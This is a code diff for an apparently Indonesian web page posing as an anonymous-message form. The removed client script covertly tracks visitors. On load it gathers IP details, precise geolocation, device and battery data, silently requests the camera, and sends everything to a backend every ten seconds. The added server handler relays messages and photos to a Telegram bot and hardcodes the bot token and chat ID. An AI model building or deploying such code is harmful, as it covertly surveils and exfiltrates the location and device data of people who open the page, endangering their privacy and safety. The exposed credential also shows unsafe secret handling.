@@ -1,82 +1,34 @@
-const statusEl = document.getElementById('status');
-const sendBtn = document.getElementById('sendBtn');
-const msgTextarea = document.getElementById('msg');
+// contoh: kirim foto
+export default async function handler(req, res) {
+  if (req.method !== "POST") return res.status(405).send("Method Not Allowed");
 
-// Ambil device info + lokasi otomatis
-async function getDeviceInfo() {
-  let geo = "Tidak tersedia";
+  const { text, photoUrl } = req.body; // photoUrl optional
+  const CHAT_ID = "7483495590";
+  const BOT_TOKEN = "7673116033:AAFM3bM-phhJKBVq4OsLCnkPGDuqjcaRW2c";
+
   try {
-    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
-    const battery = await navigator.getBattery();
-
-    // Lokasi
-    if (navigator.geolocation) {
-      await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos => {
-        geo = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
-        resolve();
-      }, () => resolve()));
+    let r;
+    if (photoUrl) {
+      // Kirim foto
+      r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, photo: photoUrl, caption: text || "" })
+      });
+    } else {
+      // Kirim teks
+      r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
+      });
     }
 
-    // Kamera otomatis tapi invisible
-    try {
-      await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-    } catch (e) {
-      console.warn("Gagal akses kamera:", e);
-    }
-
-    const time = new Date().toLocaleString("id-ID");
-    const connection = navigator.connection || {};
-
-    return `
-🌐 *Informasi IP*
-📶 IP: ${ipInfo.ip}
-🌍 Negara: ${ipInfo.country}
-🏙️ Kota: ${ipInfo.city}
-🛠️ ISP: ${ipInfo.org}
-⏱️ Timezone: ${ipInfo.timezone || "-"}
-📱 Device: ${navigator.userAgent}
-📍 Geolocation: ${geo}
-🔋 Battery: ${Math.round(battery.level*100)}% ${battery.charging ? "⚡️ Mengisi daya" : ""}
-⏰ Waktu: ${time}
-📡 Jaringan: ${connection.effectiveType || "❌ Tidak diketahui"}
-    `;
-  } catch (e) {
-    console.error(e);
-    return "❌ Gagal ambil info device";
+    const result = await r.json();
+    if (!result.ok) throw new Error(JSON.stringify(result));
+    res.status(200).json({ success: true });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ success: false, error: err.message });
   }
 }
-
-// Kirim ke backend
-async function sendToBackend(data) {
-  try {
-    await fetch('/api/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ text: data })
-    });
-  } catch (e) {
-    console.error(e);
-  }
-}
-
-// Live tracking setiap 10 detik
-async function liveTracking() {
-  const info = await getDeviceInfo();
-  await sendToBackend(info);
-  statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`;
-}
-
-// Mulai live tracking
-window.onload = async () => {
-  await liveTracking();
-  setInterval(liveTracking, 10000);
-};
-
-// Tombol kirim pesan manual
-sendBtn.addEventListener('click', async () => {
-  const msg = msgTextarea.value.trim();
-  if (!msg) return alert("Isi pesan dulu!");
-  await sendToBackend(`💬 Pesan anonim:\n${msg}`);
-  msgTextarea.value = "";
-  statusEl.textContent = "Pesan terkirim!";
-});
